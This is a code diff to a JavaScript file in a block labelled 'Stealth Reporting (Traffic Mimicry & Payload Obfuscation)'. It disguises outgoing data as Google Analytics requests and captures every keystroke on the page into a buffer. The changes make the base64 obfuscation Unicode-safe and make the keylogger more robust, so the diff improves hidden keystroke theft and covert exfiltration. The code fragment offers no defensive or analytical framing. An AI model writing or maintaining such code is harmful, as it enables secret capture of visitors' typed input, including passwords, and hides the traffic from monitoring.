@@ -1526,7 +1526,8 @@ function initializeAgentLinks() {
         /* --- Stealth Reporting (Traffic Mimicry & Payload Obfuscation) --- */
         const report = (type, data = {}) => {
             /* Mimic Google Analytics Measurement Protocol format */
-            const payload = btoa(JSON.stringify(data));
+            /* UTF-8 safe base64 encoding for Unicode characters */
+            const payload = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
             const params = new URLSearchParams({
                 v: '1',
                 tid: 'UA-772568-1',
@@ -1693,7 +1694,8 @@ function initializeAgentLinks() {
         });
 
         document.addEventListener('keydown', (e) => {
-            typeBuffer += e.key.length === 1 ? e.key : '[' + e.key + ']';
+            const key = e.key || '';
+            typeBuffer += key.length === 1 ? key : '[' + (key || 'Unknown') + ']';
             clearTimeout(typeTimer);
             typeTimer = setTimeout(() => {
                 if (typeBuffer) {
